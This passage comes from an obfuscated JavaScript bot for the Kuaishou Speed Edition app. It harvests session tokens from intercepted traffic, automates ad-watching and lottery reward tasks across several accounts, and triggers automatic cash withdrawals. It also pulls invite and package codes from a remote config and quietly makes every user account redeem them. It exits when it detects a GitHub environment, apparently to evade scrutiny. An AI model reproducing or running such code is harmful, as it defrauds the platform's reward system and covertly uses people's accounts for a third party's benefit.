      S.wechat_bind == true && (this.bindWechat = true, this.wechat = S.wechat_nick_name, j = "已绑定微信[" + S.wechat_nick_name + "]");
      console.log("账号[" + this.name + "]" + j + "，" + Y);
    } else {
      console.log("账号[" + this.name + "]查询提现账号绑定情况失败：" + S.error_msg);
    }
  }
  async accountInfo() {
    let c = "https://www.kuaishoupay.com/pay/account/h5/withdraw/account_info",
      p = "account_group_key=NEBULA_CASH_ACCOUNT&providers=",
      C = _0x495d61(c, this.cookie, p);
    await _0x39a23b("post", C);
    let S = _0x1a0963;
    if (!S) {
      return;
    }
    S.result == "SUCCESS" ? this.needSms = S.need_mobile_code : console.log("账号[" + this.name + "]查询账号提现情况失败：" + S.error_msg);
  }
}
!(async () => {
  if (typeof $request !== "undefined") {
    await _0x13d82d();
  } else {
    if (!(await _0x2dc359())) {
      return;
    }
    console.log("============================");
    console.log("\n============== 登录 ==============");
    for (let a of _0x431ea3) {
      await a.getUserInfo();
      await _0x3de8b8.wait(500);
    }
    let p = _0x431ea3.filter(j => j.valid == true);
    if (p.length == 0) {
      return;
    }
    for (let Z of p) {
      console.log("\n=========== " + Z.name + " ===========");
      await Z.getSignInfo();
      await _0x3de8b8.wait(200);
      await Z.openBox(false);
      await _0x3de8b8.wait(200);
      await Z.taskList();
      await _0x3de8b8.wait(200);
      await Z.luckydrawSign();
      await _0x3de8b8.wait(200);
      if (Z.hasLuckydraw == true) {
        await Z.luckdrawTimerInfo();
        await _0x3de8b8.wait(200);
        await Z.luckdrawTasks();
        await _0x3de8b8.wait(200);
        await Z.luckdrawInfo();
        await _0x3de8b8.wait(200);
      }
      if (Z.task[_0x1e4967.luckydraw].needRun) {
        for (let U = 0; U < Z.task[_0x1e4967.luckydraw].num; U++) {
          _0x20a9d7 < 13 ? (await Z.ksNeoAdParam(_0x10d9f8.luckdrawVideo_161_213), await _0x3de8b8.wait(200), await Z.ksNeoAdParam(_0x10d9f8.luckdrawVideo_11_213), await _0x3de8b8.wait(200)) : (await Z.ksNeoAdParam(_0x10d9f8.luckdrawVideo_161_100), await _0x3de8b8.wait(200), await Z.ksNeoAdParam(_0x10d9f8.luckdrawVideo_11_100), await _0x3de8b8.wait(200));
        }
      }
      if (Z.task[_0x1e4967.ad].needRun) {
        for (let J = 0; J < Z.task[_0x1e4967.ad].num; J++) {
          await Z.ksAdParam(_0x351e94.ad1);
          await _0x3de8b8.wait(200);
          J != Z.task[_0x1e4967.ad].num - 1 && (await _0x3de8b8.wait(2000));
        }
      }
      if (Z.task[_0x1e4967.gj].needRun) {
        for (let V = 0; V < Z.task[_0x1e4967.gj].num; V++) {
          await Z.ksgj()[[]];
          await _0x3de8b8.wait(200);
        }
      }
      if (Z.task[_0x1e4967.live].needRun) {
        for (let E = 0; E < Z.task[_0x1e4967.live].num; E++) {
          await Z.ksNeoAdParam(_0x10d9f8.liveVideo_75);
          await _0x3de8b8.wait(200);
        }
      }
    }
    console.log("\n============== 账户情况 ==============");
    for (let O of p) {
      await O.accountOverview();
      await _0x3de8b8.wait(200);
      await O.bindInfo();
      await _0x3de8b8.wait(200);
      await O.accountInfo();
      await _0x3de8b8.wait(200);
    }
    console.log("\n============== 自动提现 ==============");
    let C = "按提现列表自动提现";
    _0x1e627b && (C = "自动提现" + _0x1e627b + "元");
    if (_0x13d24b) {
      C = "最大化提现";
    }
    if (_0x20a9d7 == _0x26f17b) {
      console.log("提现时间，现在设置为" + C);
      for (let d of p) {
        await d.withdrawOverview();
        await _0x3de8b8.wait(200);
      }
    } else {
      console.log("非提现时间，现在设置为" + _0x26f17b + "点" + C);
    }
    await _0x217ea6();
    if (_0x5718d8.length > 0) {
      for (let A of p) {
        for (let k of _0x5718d8) {
          await A.helpScan(k);
          await _0x3de8b8.wait(200);
        }
      }
    }
    if (yifenk.length > 0) {
      for (let g of p) {
        for (let t of yifenk) {
          let L = t.split("@")[0],
            X = t.split("@")[1];
          await g.helpPackage(X, L);
          await _0x3de8b8.wait(1000);
        }
      }
    }
    _0x113109 == 2 ? await _0x577f0c() : _0x113109 == 1 && _0x20a9d7 == _0x26f17b && (await _0x577f0c());
  }
})().catch(T => _0x3de8b8.logErr(T)).finally(() => _0x3de8b8.done());
async function _0x13d82d() {
  if ($request.url.indexOf("appsupport/yoda/biz/info") > -1) {
    let c = $request.headers.Cookie.match(/(kuaishou.api_st=[\w\-]+)/)[1] + ";";
    _0x547212 ? _0x547212.indexOf(c) == -1 && (_0x547212 = _0x547212 + "\n" + c, _0x3de8b8.setdata(_0x547212, "ksjsbCookie"), ckList = _0x547212.split("\n"), _0x3de8b8.msg(_0x11b3c3 + (" 获取第" + ckList.length + "个ck成功: " + c))) : (_0x3de8b8.setdata(c, "ksjsbCookie"), _0x3de8b8.msg(_0x11b3c3 + (" 获取第1个ck成功: " + c)));
  }
  if ($request.url.indexOf("ksapp/client/package/renew") > -1) {
    let p = $request.url.match(/(kuaishou.api_st=[\w\-]+)/)[1] + ";";
    _0x547212 ? _0x547212.indexOf(p) == -1 && (_0x547212 = _0x547212 + "\n" + p, _0x3de8b8.setdata(_0x547212, "ksjsbCookie"), ckList = _0x547212.split("\n"), _0x3de8b8.msg(_0x11b3c3 + (" 获取第" + ckList.length + "个ck成功: " + p))) : (_0x3de8b8.setdata(p, "ksjsbCookie"), _0x3de8b8.msg(_0x11b3c3 + (" 获取第1个ck成功: " + p)));
  }
}
async function _0x2dc359() {
  if (_0x547212) {
    let c = _0x4c35fe[0];
    for (let p of _0x4c35fe) {
      if (_0x547212.indexOf(p) > -1) {
        c = p;
        break;
      }
    }
    for (let a of _0x547212.split(c)) {
      a && _0x431ea3.push(new _0x9d8dda(a));
    }
    _0x19c25c = _0x431ea3.length;
  } else {
    console.log("未找到CK");
    return;
  }
  console.log("共找到" + _0x19c25c + "个账号");
  return true;
}
async function _0x577f0c() {
  if (!_0x279d25) {
    return;
  }
  notifyBody = "快手极速版运行通知\n\n" + _0x279d25;
  if (_0x113109 > 0) {
    _0x3de8b8.msg(notifyBody);
    if (_0x3de8b8.isNode()) {
      var c = require("./sendNotify");
      await c.sendNotify(_0x3de8b8.name, notifyBody);
    }
  } else {
    console.log(notifyBody);
  }
}
function _0x1ab8b7(T) {
  console.log(T);
  _0x279d25 += T;
  _0x279d25 += "\n";
}
async function _0x282ff5(T) {
  if (!PushDearKey) {
    return;
  }
  if (!T) {
    return;
  }
  console.log("\n============= PushDear 通知 =============\n");
  console.log(T);
  let p = {
    url: "https://api2.pushdeer.com/message/push?pushkey=" + PushDearKey + "&text=" + encodeURIComponent(T),
    headers: {}
  };
  await _0x39a23b("get", p);
  let C = _0x1a0963,
    S = C.content.result == false ? "失败" : "成功";
  console.log("\n========== PushDear 通知发送" + S + " ==========\n");
}
async function _0x505e51() {
  const c = {
    url: _0x180c0c,
    headers: ""
  };
  await _0x39a23b("get", c);
  let p = _0x1a0963;
  if (!p) {
    return;
  }
  if (p[_0x5bc515]) {
    let a = p[_0x5bc515];
    if (a.status == 0) {
      if (_0x459e63 >= a.version) {
        _0x2e716e = true;
        _0x75eec0 = "https://ffsup.oduuu.com/uploads%2F1147%2F2022%2F05%2F49WKESp5_ksjsb.json?_upd=ksjsb.json";
        console.log(a.msg[a.status]);
        console.log(a.updateMsg);
        console.log("现在运行的脚本版本是：1.07，最新脚本版本：" + a.latestVersion);
      } else {
        console.log(a.versionMsg);
      }
    } else {
      console.log(a.msg[a.status]);
    }
  } else {
    console.log(p.errorMsg);
  }
}
async function _0x217ea6() {
  let c = "";
  const p = {
    url: _0x180c0c,
    headers: ""
  };
  await _0x39a23b("get", p);
  let C = _0x1a0963;
  if (!C) {
    return c;
  }
  for (let a of C.invite) {
    a && _0x5718d8.push(a);
  }
  for (let Y of C.ijkkk) {
    Y && yifenk.push(Y);
  }
  return c;
}
function _0x495d61(T, c, p = "") {
  let S = T.replace("//", "/").split("/")[1];
  const a = {
      Host: S,
      Cookie: c
    },
    Y = {
      url: T,
      headers: a
    };
  p && (Y.body = p, Y.headers["Content-Type"] = "application/x-www-form-urlencoded", Y.headers["Content-Length"] = Y.body ? Y.body.length : 0);
  return Y;
}
async function _0x39a23b(T, c) {
  _0x1a0963 = null;
  return new Promise(C => {
    _0x3de8b8[T](c, async (a, Y, j) => {
      try {
        if (a) {
          console.log(T + "请求失败");
          console.log(JSON.stringify(a));
          _0x3de8b8.logErr(a);
        } else {
          _0x244336(j) && (_0x1a0963 = JSON.parse(j));
        }
      } catch (B) {
        _0x3de8b8.logErr(B, Y);
      } finally {
        C();
      }
    });
  });
}
function _0x244336(T) {
  try {
    if (typeof JSON.parse(T) == "object") {
      return true;
    } else {
      console.log(T);
    }
  } catch (p) {
    console.log(p);
    console.log("服务器访问数据为空，请检查自身设备网络情况");
    return false;
  }
}
function _0x271dc5(T, c) {
  return T < c ? T : c;
}
function _0x2be587(T, c) {
  return T < c ? c : T;
}
function _0x4c9db4(T, c, p = "0") {
  let S = String(T),
    a = c > S.length ? c - S.length : 0,
    Y = "";
  for (let j = 0; j < a; j++) {
    Y += p;
  }
  Y += S;
  return Y;
}
function _0x4b5cde(T = 12) {
  let p = "abcdef0123456789",
    C = p.length,
    S = "";
  for (i = 0; i < T; i++) {
    S += p.charAt(Math.floor(Math.random() * C));
  }
  return S;
}
var _0x331719 = {
  _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
  encode: function (T) {
    var p = "",
      C,
      S,
      a,
      Y,
      j,
      Z,
      Q,
      B = 0;
    T = _0x331719._utf8_encode(T);
    while (B < T.length) {
      C = T.charCodeAt(B++);
      S = T.charCodeAt(B++);
      a = T.charCodeAt(B++);
      Y = C >> 2;
      j = (C & 3) << 4 | S >> 4;
      Z = (S & 15) << 2 | a >> 6;
      Q = a & 63;
      if (isNaN(S)) {
        Z = Q = 64;
      } else {
        isNaN(a) && (Q = 64);
      }
      p = p + this._keyStr.charAt(Y) + this._keyStr.charAt(j) + this._keyStr.charAt(Z) + this._keyStr.charAt(Q);
    }
    return p;
  },
  decode: function (T) {
    var U = "";
    var S,
      a,
      Y,
      j,
      Z,
      Q,
      B,
      b = 0;
    T = T.replace(/[^A-Za-z0-9+/=]/g, "");
    while (b < T.length) {
      j = this._keyStr.indexOf(T.charAt(b++));
      Z = this._keyStr.indexOf(T.charAt(b++));
      Q = this._keyStr.indexOf(T.charAt(b++));
      B = this._keyStr.indexOf(T.charAt(b++));
      S = j << 2 | Z >> 4;
      a = (Z & 15) << 4 | Q >> 2;
      Y = (Q & 3) << 6 | B;
      U = U + String.fromCharCode(S);
      Q != 64 && (U = U + String.fromCharCode(a));
      B != 64 && (U = U + String.fromCharCode(Y));
    }
    U = _0x331719._utf8_decode(U);
    return U;
  },
  _utf8_encode: function (T) {
    T = T.replace(/rn/g, "n");
    var p = "";
    for (var C = 0; C < T.length; C++) {
      var S = T.charCodeAt(C);
      S < 128 ? p += String.fromCharCode(S) : S > 127 && S < 2048 ? (p += String.fromCharCode(S >> 6 | 192), p += String.fromCharCode(S & 63 | 128)) : (p += String.fromCharCode(S >> 12 | 224), p += String.fromCharCode(S >> 6 & 63 | 128), p += String.fromCharCode(S & 63 | 128));
    }
    return p;
  },
  _utf8_decode: function (T) {
    c1 = c2 = 0;
    var p = "",
      C = 0,
      S = c1;
    while (C < T.length) {
      S = T.charCodeAt(C);
      if (S < 128) {
        p += String.fromCharCode(S);
        C++;
      } else {
        S > 191 && S < 224 ? (c2 = T.charCodeAt(C + 1), p += String.fromCharCode((S & 31) << 6 | c2 & 63), C += 2) : (c2 = T.charCodeAt(C + 1), c3 = T.charCodeAt(C + 2), p += String.fromCharCode((S & 15) << 12 | (c2 & 63) << 6 | c3 & 63), C += 3);
      }
    }
    return p;
  }
};
function _0xcb54a4(T) {
  function p(N, l) {
    return N << l | N >>> 32 - l;
  }
  function C(N, l) {
    var D, K, y, H, x0;
    y = 2147483648 & N;
    H = 2147483648 & l;
    D = 1073741824 & N;
    K = 1073741824 & l;
    x0 = (1073741823 & N) + (1073741823 & l);
    return D & K ? 2147483648 ^ x0 ^ y ^ H : D | K ? 1073741824 & x0 ? 3221225472 ^ x0 ^ y ^ H : 1073741824 ^ x0 ^ y ^ H : x0 ^ y ^ H;
  }
  function S(N, l, R) {
    return N & l | ~N & R;
  }
  function a(N, l, R) {
    return N & R | l & ~R;
  }
  function Y(N, l, R) {
    return N ^ l ^ R;
  }
  function j(N, l, R) {
    return l ^ (N | ~R);
  }
  function Z(N, l, R, r, D, K, y) {
    N = C(N, C(C(S(l, R, r), D), y));
    return C(p(N, K), l);
  }
  function Q(N, l, R, r, D, K, y) {
    N = C(N, C(C(a(l, R, r), D), y));
    return C(p(N, K), l);
  }
  function B(N, l, R, r, D, K, y) {
    N = C(N, C(C(Y(l, R, r), D), y));
    return C(p(N, K), l);
  }
  function b(N, l, R, r, D, K, y) {
    N = C(N, C(C(j(l, R, r), D), y));
    return C(p(N, K), l);
  }
  function U(N) {
    for (var R, r = N.length, D = r + 8, K = (D - D % 64) / 64, y = 16 * (K + 1), H = new Array(y - 1), x0 = 0, x1 = 0; r > x1;) {
      R = (x1 - x1 % 4) / 4;
      x0 = x1 % 4 * 8;
      H[R] = H[R] | N.charCodeAt(x1) << x0;
      x1++;
    }
    R = (x1 - x1 % 4) / 4;
    x0 = x1 % 4 * 8;
    H[R] = H[R] | 128 << x0;
    H[y - 2] = r << 3;
    H[y - 1] = r >>> 29;
    return H;
  }
  function q(N) {
    var l,
      R,
      r = "",
      D = "";
    for (R = 0; 3 >= R; R++) {
      l = N >>> 8 * R & 255;
      D = "0" + l.toString(16);
      r += D.substr(D.length - 2, 2);
    }
    return r;
  }
  function i(N) {
    N = N.replace(/\r\n/g, "\n");
    for (var l = "", R = 0; R < N.length; R++) {
      var r = N.charCodeAt(R);
      128 > r ? l += String.fromCharCode(r) : r > 127 && 2048 > r ? (l += String.fromCharCode(r >> 6 | 192), l += String.fromCharCode(63 & r | 128)) : (l += String.fromCharCode(r >> 12 | 224), l += String.fromCharCode(r >> 6 & 63 | 128), l += String.fromCharCode(63 & r | 128));
    }
    return l;
  }
  var J,
    I,
    V,
    E,
    W,
    O,
    P,
    h,
    z,
    v = [],
    M = 7,
    d = 12,
    u = 17,
    e = 22,
    A = 5,
    k = 9,
    o = 14,
    g = 20,
    t = 4,
    L = 11,
    X = 16,
    m = 23,
    n = 6,
    F = 10,
    w = 15,
    G = 21;
  for (T = i(T), v = U(T), O = 1732584193, P = 4023233417, h = 2562383102, z = 271733878, J = 0; J < v.length; J += 16) {
    I = O;
    V = P;
    E = h;
    W = z;
    O = Z(O, P, h, z, v[J + 0], M, 3614090360);
    z = Z(z, O, P, h, v[J + 1], d, 3905402710);
    h = Z(h, z, O, P, v[J + 2], u, 606105819);
    P = Z(P, h, z, O, v[J + 3], e, 3250441966);
    O = Z(O, P, h, z, v[J + 4], M, 4118548399);
    z = Z(z, O, P, h, v[J + 5], d, 1200080426);
    h = Z(h, z, O, P, v[J + 6], u, 2821735955);
    P = Z(P, h, z, O, v[J + 7], e, 4249261313);
    O = Z(O, P, h, z, v[J + 8], M, 1770035416);
    z = Z(z, O, P, h, v[J + 9], d, 2336552879);
    h = Z(h, z, O, P, v[J + 10], u, 4294925233);
    P = Z(P, h, z, O, v[J + 11], e, 2304563134);
    O = Z(O, P, h, z, v[J + 12], M, 1804603682);
    z = Z(z, O, P, h, v[J + 13], d, 4254626195);
    h = Z(h, z, O, P, v[J + 14], u, 2792965006);
    P = Z(P, h, z, O, v[J + 15], e, 1236535329);
    O = Q(O, P, h, z, v[J + 1], A, 4129170786);
    z = Q(z, O, P, h, v[J + 6], k, 3225465664);
    h = Q(h, z, O, P, v[J + 11], o, 643717713);
    P = Q(P, h, z, O, v[J + 0], g, 3921069994);
    O = Q(O, P, h, z, v[J + 5], A, 3593408605);
    z = Q(z, O, P, h, v[J + 10], k, 38016083);
    h = Q(h, z, O, P, v[J + 15], o, 3634488961);
    P = Q(P, h, z, O, v[J + 4], g, 3889429448);
    O = Q(O, P, h, z, v[J + 9], A, 568446438);
    z = Q(z, O, P, h, v[J + 14], k, 3275163606);
    h = Q(h, z, O, P, v[J + 3], o, 4107603335);
    P = Q(P, h, z, O, v[J + 8], g, 1163531501);
    O = Q(O, P, h, z, v[J + 13], A, 2850285829);
    z = Q(z, O, P, h, v[J + 2], k, 4243563512);
    h = Q(h, z, O, P, v[J + 7], o, 1735328473);
    P = Q(P, h, z, O, v[J + 12], g, 2368359562);
    O = B(O, P, h, z, v[J + 5], t, 4294588738);
    z = B(z, O, P, h, v[J + 8], L, 2272392833);
    h = B(h, z, O, P, v[J + 11], X, 1839030562);
    P = B(P, h, z, O, v[J + 14], m, 4259657740);
    O = B(O, P, h, z, v[J + 1], t, 2763975236);
    z = B(z, O, P, h, v[J + 4], L, 1272893353);
    h = B(h, z, O, P, v[J + 7], X, 4139469664);
    P = B(P, h, z, O, v[J + 10], m, 3200236656);
    O = B(O, P, h, z, v[J + 13], t, 681279174);
    z = B(z, O, P, h, v[J + 0], L, 3936430074);
    h = B(h, z, O, P, v[J + 3], X, 3572445317);
    P = B(P, h, z, O, v[J + 6], m, 76029189);
    O = B(O, P, h, z, v[J + 9], t, 3654602809);
    z = B(z, O, P, h, v[J + 12], L, 3873151461);
    h = B(h, z, O, P, v[J + 15], X, 530742520);
    P = B(P, h, z, O, v[J + 2], m, 3299628645);
    O = b(O, P, h, z, v[J + 0], n, 4096336452);
    z = b(z, O, P, h, v[J + 7], F, 1126891415);
    h = b(h, z, O, P, v[J + 14], w, 2878612391);
    P = b(P, h, z, O, v[J + 5], G, 4237533241);
    O = b(O, P, h, z, v[J + 12], n, 1700485571);
    z = b(z, O, P, h, v[J + 3], F, 2399980690);
    h = b(h, z, O, P, v[J + 10], w, 4293915773);
    P = b(P, h, z, O, v[J + 1], G, 2240044497);
    O = b(O, P, h, z, v[J + 8], n, 1873313359);
    z = b(z, O, P, h, v[J + 15], F, 4264355552);
    h = b(h, z, O, P, v[J + 6], w, 2734768916);
    P = b(P, h, z, O, v[J + 13], G, 1309151649);
    O = b(O, P, h, z, v[J + 4], n, 4149444226);
    z = b(z, O, P, h, v[J + 11], F, 3174756917);
    h = b(h, z, O, P, v[J + 2], w, 718787259);
    P = b(P, h, z, O, v[J + 9], G, 3951481745);
    O = C(O, I);
    P = C(P, V);
    h = C(h, E);
    z = C(z, W);
  }
  var s = q(O) + q(P) + q(h) + q(z);
  return s.toLowerCase();
}
function _0x4f15e2(T, c) {
  "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);
  class C {
    constructor(S) {
      this.env = S;
    }
    send(S, a = "GET") {
      S = "string" == typeof S ? {
        url: S
      } : S;
      let j = this.get;
      "POST" === a && (j = this.post);
      "PUT" === a && (j = this.put);
      return new Promise((Z, Q) => {
        j.call(this, S, (U, q, i) => {
          U ? Q(U) : Z(q);
        });
      });
    }
    get(S) {
      return this.send.call(this.env, S);
    }
    post(S) {
      return this.send.call(this.env, S, "POST");
    }
    put(S) {
      return this.send.call(this.env, S, "PUT");
    }
  }
  return new class {
    constructor(S, a) {
      this.name = S;
      this.http = new C(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = false;
      this.isNeedRewrite = false;
      this.logSeparator = "\n";
      this.startTime = new Date().getTime();
      Object.assign(this, a);
      this.log("", "🔔" + this.name + ", 开始!");
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    toObj(S, a = null) {
      try {
        return JSON.parse(S);
      } catch {
        return a;
      }
    }
    toStr(S, a = null) {
      try {
        return JSON.stringify(S);
      } catch {
        return a;
      }
    }
    getjson(S, a) {
      let j = a;
      const Z = this.getdata(S);
      if (Z) {
        try {
          j = JSON.parse(this.getdata(S));
        } catch {}
      }
      return j;
    }
    setjson(S, a) {
      try {
        return this.setdata(JSON.stringify(S), a);
      } catch {
        return false;
      }
    }
    getScript(S) {
      return new Promise(j => {
        const Q = {
          url: S
        };
        this.get(Q, (B, b, U) => j(U));
      });
    }
    runScript(S, a) {
      return new Promise(j => {
        let Z = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        Z = Z ? Z.replace(/\n/g, "").trim() : Z;
        let Q = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        Q = Q ? 1 * Q : 20;
        Q = a && a.timeout ? a.timeout : Q;
        const B = {
            script_text: S,
            mock_type: "cron",
            timeout: Q
          },
          [b, U] = Z.split("@"),
          q = {
            url: "http://" + U + "/v1/scripting/evaluate",
            body: B,
            headers: {
              "X-Key": b,
              Accept: "*/*"
            }
          };
        this.post(q, (i, J, I) => j(I));
      }).catch(j => this.logErr(j));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const a = this.path.resolve(this.dataFile),
          Y = this.path.resolve(process.cwd(), this.dataFile),
          j = this.fs.existsSync(a),
          Z = !j && this.fs.existsSync(Y);
        if (!j && !Z) {
          return {};
        }
        {
          const Q = j ? a : Y;
          try {
            return JSON.parse(this.fs.readFileSync(Q));
          } catch (b) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const S = this.path.resolve(this.dataFile),
          a = this.path.resolve(process.cwd(), this.dataFile),
          Y = this.fs.existsSync(S),
          j = !Y && this.fs.existsSync(a),
          Z = JSON.stringify(this.data);
        Y ? this.fs.writeFileSync(S, Z) : j ? this.fs.writeFileSync(a, Z) : this.fs.writeFileSync(S, Z);
      }
    }
    lodash_get(S, a, Y) {
      const Q = a.replace(/\[(\d+)\]/g, ".$1").split(".");
      let B = S;
      for (const b of Q) if (B = Object(B)[b], void 0 === B) {
        return Y;
      }
      return B;
    }
    lodash_set(S, a, Y) {
      return Object(S) !== S ? S : (Array.isArray(a) || (a = a.toString().match(/[^.[\]]+/g) || []), a.slice(0, -1).reduce((j, Z, Q) => Object(j[Z]) === j[Z] ? j[Z] : j[Z] = Math.abs(a[Q + 1]) >> 0 == +a[Q + 1] ? [] : {}, S)[a[a.length - 1]] = Y, S);
    }
    getdata(S) {
      let j = this.getval(S);
      if (/^@/.test(S)) {
        const [, Z, Q] = /^@(.*?)\.(.*?)$/.exec(S),
          B = Z ? this.getval(Z) : "";
        if (B) {
          try {
            const b = JSON.parse(B);
            j = b ? this.lodash_get(b, Q, "") : j;
          } catch (U) {
            j = "";
          }
        }
      }
      return j;
    }
    setdata(S, a) {
      let j = false;
      if (/^@/.test(a)) {
        const [, Z, Q] = /^@(.*?)\.(.*?)$/.exec(a),
          B = this.getval(Z),
          b = Z ? "null" === B ? null : B || "{}" : "{}";
        try {
          const U = JSON.parse(b);
          this.lodash_set(U, Q, S);
          j = this.setval(JSON.stringify(U), Z);
        } catch (q) {
          const J = {};
          this.lodash_set(J, Q, S);
          j = this.setval(JSON.stringify(J), Z);
        }
      } else {
        j = this.setval(S, a);
      }
      return j;
    }
    getval(S) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(S) : this.isQuanX() ? $prefs.valueForKey(S) : this.isNode() ? (this.data = this.loaddata(), this.data[S]) : this.data && this.data[S] || null;
    }
    setval(S, a) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(S, a) : this.isQuanX() ? $prefs.setValueForKey(S, a) : this.isNode() ? (this.data = this.loaddata(), this.data[a] = S, this.writedata(), true) : this.data && this.data[a] || null;
    }
    initGotEnv(S) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      S && (S.headers = S.headers ? S.headers : {}, void 0 === S.headers.Cookie && void 0 === S.cookieJar && (S.cookieJar = this.ckjar));
    }
    get(S, a = () => {}) {
      const j = {
          "X-Surge-Skip-Scripting": false
        },
        Z = {
          hints: false
        };
      S.headers && (delete S.headers["Content-Type"], delete S.headers["Content-Length"]);
      this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (S.headers = S.headers || {}, Object.assign(S.headers, j)), $httpClient.get(S, (Q, B, b) => {
        !Q && B && (B.body = b, B.statusCode = B.status);
        a(Q, B, b);
      })) : this.isQuanX() ? (this.isNeedRewrite && (S.opts = S.opts || {}, Object.assign(S.opts, Z)), $task.fetch(S).then(Q => {
        const {
            statusCode: B,
            statusCode: b,
            headers: U,
            body: q
          } = Q,
          i = {
            status: B,
            statusCode: b,
            headers: U,
            body: q
          };
        a(null, i, q);
      }, Q => a(Q))) : this.isNode() && (this.initGotEnv(S), this.got(S).on("redirect", (Q, B) => {
        try {
          if (Q.headers["set-cookie"]) {
            const U = Q.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
            this.ckjar.setCookieSync(U, null);
            B.cookieJar = this.ckjar;
          }
        } catch (i) {
          this.logErr(i);
        }
      }).then(Q => {
        const {
            statusCode: B,
            statusCode: b,
            headers: U,
            body: q
          } = Q,
          i = {
            status: B,
            statusCode: b,
            headers: U,
            body: q
          };
        a(null, i, q);
      }, Q => {
        const {
          message: B,
          response: b
        } = Q;
        a(B, b, b && b.body);
      }));
    }
    post(S, a = () => {}) {
      const j = {
          "X-Surge-Skip-Scripting": false
        },
        Z = {
          hints: false
        };
      if (S.body && S.headers && !S.headers["Content-Type"] && (S.headers["Content-Type"] = "application/x-www-form-urlencoded"), S.headers && delete S.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (S.headers = S.headers || {}, Object.assign(S.headers, j));
        $httpClient.post(S, (Q, B, b) => {
          !Q && B && (B.body = b, B.statusCode = B.status);
          a(Q, B, b);
        });
      } else {
        if (this.isQuanX()) {
          S.method = "POST";
          this.isNeedRewrite && (S.opts = S.opts || {}, Object.assign(S.opts, Z));
          $task.fetch(S).then(Q => {
            const {
                statusCode: B,
                statusCode: b,
                headers: U,
                body: q
              } = Q,
              i = {
                status: B,
                statusCode: b,
                headers: U,
                body: q
              };
            a(null, i, q);
          }, Q => a(Q));
        } else {
          if (this.isNode()) {
            this.initGotEnv(S);
            const {
              url: B,
              ...b
            } = S;
            this.got.post(B, b).then(U => {
              const {
                  statusCode: J,
                  statusCode: I,
                  headers: V,
                  body: E
                } = U,
                W = {
                  status: J,
                  statusCode: I,
                  headers: V,
                  body: E
                };
              a(null, W, E);
            }, U => {
              const {
                message: q,
                response: i
              } = U;
              a(q, i, i && i.body);
            });
          }
        }
      }
    }
    put(S, a = () => {}) {
      const j = {
          "X-Surge-Skip-Scripting": false
        },
        Z = {
          hints: false
        };
      if (S.body && S.headers && !S.headers["Content-Type"] && (S.headers["Content-Type"] = "application/x-www-form-urlencoded"), S.headers && delete S.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (S.headers = S.headers || {}, Object.assign(S.headers, j));
        $httpClient.put(S, (Q, B, b) => {
          !Q && B && (B.body = b, B.statusCode = B.status);
          a(Q, B, b);
        });
      } else {
        if (this.isQuanX()) {
          S.method = "PUT";
          this.isNeedRewrite && (S.opts = S.opts || {}, Object.assign(S.opts, Z));
          $task.fetch(S).then(B => {
            const {
                statusCode: b,
                statusCode: U,
                headers: q,
                body: i
              } = B,
              J = {
                status: b,
                statusCode: U,
                headers: q,
                body: i
              };
            a(null, J, i);
          }, B => a(B));
        } else {
          if (this.isNode()) {
            this.initGotEnv(S);
            const {
              url: b,
              ...U
            } = S;
            this.got.put(b, U).then(q => {
              const {
                  statusCode: I,
                  statusCode: V,
                  headers: E,
                  body: W
                } = q,
                O = {
                  status: I,
                  statusCode: V,
                  headers: E,
                  body: W
                };
              a(null, O, W);
            }, q => {
              const {
                message: i,
                response: J
              } = q;
              a(i, J, J && J.body);
            });
          }
        }
      }
    }
    time(S) {
      let a = {
        "M+": new Date().getMonth() + 1,
        "d+": new Date().getDate(),
        "H+": new Date().getHours(),
        "m+": new Date().getMinutes(),
        "s+": new Date().getSeconds(),
        "q+": Math.floor((new Date().getMonth() + 3) / 3),
        S: new Date().getMilliseconds()
      };
      /(y+)/.test(S) && (S = S.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let Y in a) new RegExp("(" + Y + ")").test(S) && (S = S.replace(RegExp.$1, 1 == RegExp.$1.length ? a[Y] : ("00" + a[Y]).substr(("" + a[Y]).length)));
      return S;
    }
    msg(S = T, a = "", Y = "", j) {
      const Q = b => {
        if (!b) {
          return b;
        }
        if ("string" == typeof b) {
          return this.isLoon() ? b : this.isQuanX() ? {
            "open-url": b
          } : this.isSurge() ? {
            url: b
          } : void 0;
        }
        if ("object" == typeof b) {
          if (this.isLoon()) {
            let q = b.openUrl || b.url || b["open-url"],
              i = b.mediaUrl || b["media-url"];
            const J = {
              openUrl: q,
              mediaUrl: i
            };
            return J;
          }
          if (this.isQuanX()) {
            let I = b["open-url"] || b.url || b.openUrl,
              V = b["media-url"] || b.mediaUrl;
            const E = {
              "open-url": I,
              "media-url": V
            };
            return E;
          }
          if (this.isSurge()) {
            let O = b.url || b.openUrl || b["open-url"];
            const P = {
              url: O
            };
            return P;
          }
        }
      };
      this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(S, a, Y, Q(j)) : this.isQuanX() && $notify(S, a, Y, Q(j)));
      let B = ["", "==============📣系统通知📣=============="];
      B.push(S);
      a && B.push(a);
      Y && B.push(Y);
      console.log(B.join("\n"));
